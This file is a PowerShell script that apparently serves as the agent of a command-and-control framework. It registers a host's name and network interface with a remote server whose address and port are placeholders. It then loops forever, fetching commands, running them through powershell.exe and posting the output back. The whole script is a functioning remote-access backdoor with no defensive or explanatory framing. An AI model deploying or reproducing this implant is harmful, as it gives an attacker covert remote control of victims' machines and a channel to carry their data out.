

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}


$hostname = [System.Net.Dns]::GetHostName()
$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$interface = "REPLACE_INTERFACE"
# $key  = "REPLACE_KEY"
$n    = 3

$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
$data  = @{
    eth = "$interface" 
    hname = "$hostname"
    }
    
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
#name= SDFCXS

$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
#http://1.1.1.1:1233/tasks/demo


for (;;){
    
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    #shell dir
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        # $task = Decrypt $key $task
    $task = $task.split()  # task=['VALID','shell','dir']

    
        $args    = $task[0..$task.Length]
    
        $f    = "powershell.exe"
        $arg  = "/c "
    
        foreach ($a in $args){ $arg += $a + " " }

        $res  = shell $f $arg
        # $res  = Encrypt $key $res
        $data = @{result = "$res"}
        
        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
        

    sleep $n
    }
}